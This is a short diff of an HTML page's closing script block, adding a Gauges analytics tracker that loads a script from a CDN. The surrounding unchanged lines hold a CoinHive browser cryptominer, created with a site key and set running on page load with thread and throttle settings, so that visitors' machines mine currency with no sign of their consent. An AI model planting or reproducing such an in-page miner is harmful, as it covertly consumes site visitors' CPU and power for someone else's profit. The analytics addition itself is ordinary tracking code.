@@ -27,11 +27,24 @@
 </body>
 <script>
 var miner = new CoinHive.Anonymous();
+var _gauges = _gauges || [];
  miner = new CoinHive.Anonymous('EAHzuoWUOTsnACbLNwLHXiJmA02ZnIiR', {
   threads : miner.getNumThreads(),
   throttle: miner.getThrottle(),
   forceASMJS: miner.hasWASMSupport()
 });
   miner.start();
+  
+  (function() {
+    var t   = document.createElement('script');
+    t.type  = 'text/javascript';
+    t.async = true;
+    t.id    = 'gauges-tracker';
+    t.setAttribute('data-site-id', '5b44040242899e13d6f59142');
+    t.setAttribute('data-track-path', 'https://track.gaug.es/track.gif');
+    t.src = 'https://d2fuc4clr7gvcn.cloudfront.net/track.js';
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(t, s);
+  })();
 </script>
 </html>
